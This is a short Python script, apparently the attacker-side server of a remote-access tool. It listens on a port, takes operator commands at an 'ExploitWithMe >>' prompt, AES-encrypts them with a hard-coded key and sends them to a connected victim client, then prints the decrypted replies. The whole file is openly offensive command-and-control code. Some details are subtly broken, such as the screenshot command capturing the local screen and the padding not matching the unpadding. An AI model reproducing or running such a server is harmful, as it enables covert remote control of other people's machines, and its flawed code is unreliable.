import os
import socket
import sys
from Crypto import Random
from Crypto.Cipher import AES
import pyscreenshot as ImageGrab

# Configuration
HOST = 'localhost'
PORT = 829
KEY = '82e672ae054aa4de6f042c888111686a'

# Function to pad plaintext to match block size
def pad_plaintext(plaintext):
    block_size = AES.block_size
    padding_length = block_size - len(plaintext) % block_size
    padding = bytes([padding_length]) * padding_length
    return plaintext + padding

# Function to encrypt plaintext using AES in CBC mode
def encrypt(plaintext):
    plaintext = pad_plaintext(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY.encode(), AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

# Function to decrypt ciphertext using AES in CBC mode
def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY.encode(), AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

# Function to capture and save a screenshot
def capture_screenshot():
    try:
        ImageGrab.grab_to_file('im.png')
    except Exception as e:
        print("Error occurred while taking screenshot:", e)

# Main function to handle server-side logic
def main():
    # Setup server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(10)
    print('Attacker Listening Server Started on Port {}...'.format(PORT))

    # Accept incoming connections
    conn, _ = server_socket.accept()

    # Main loop for handling commands
    while True:
        # Prompt for command
        command = input('ExploitWithMe >> ').rstrip()

        # Check for special command to capture a screenshot
        if command == 'grab_screen':
            capture_screenshot()
            os.system("cat im.png")

        # Check for termination command
        elif command == '':
            continue

        # Encrypt and send command to the client
        conn.send(encrypt(command))

        # Check if command is a termination command
        if command == 'terminate':
            server_socket.close()
            sys.exit(0)

        # Receive and decrypt response from the client
        data = conn.recv(4096)
        print(decrypt(data))

if __name__ == '__main__':
    main()
